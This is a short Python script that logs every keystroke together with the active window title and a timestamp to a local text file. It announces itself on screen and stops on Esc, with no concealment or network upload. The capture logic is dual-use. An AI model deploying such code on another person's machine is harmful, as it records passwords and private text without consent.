from datetime import datetime
from pynput import keyboard
import pygetwindow as gw

LOG_FILE = "keystrokes_with_app_log.txt"

def get_active_window_title():
    try:
        window = gw.getActiveWindow()

        if window is None:
            return "Unknown / Desktop"

        title = window.title.strip()
        return title if title else "Unknown Application"

    except Exception as error:
        return f"Unavailable ({error})"

def format_key(key):
    # Normal printable characters
    if hasattr(key, "char") and key.char is not None:
        return key.char

    # Special keys: Space, Enter, Backspace, Shift, etc.
    return f"[{key}]"

def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    active_app = get_active_window_title()
    key_name = format_key(key)

    line = f"[{timestamp}] App: {active_app} | Key: {key_name}\n"

    with open(LOG_FILE, "a", encoding="utf-8") as file:
        file.write(line)

    # Stop when Esc is pressed
    if key == keyboard.Key.esc:
        print("\nLogging stopped.")
        return False

def main():
    print("=" * 60)
    print("VISIBLE KEY LOGGER WITH ACTIVE APPLICATION")
    print("This tool records keystrokes and the focused window title.")
    print(f"Local log file: {LOG_FILE}")
    print("Press Esc to stop.")
    print("=" * 60)

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()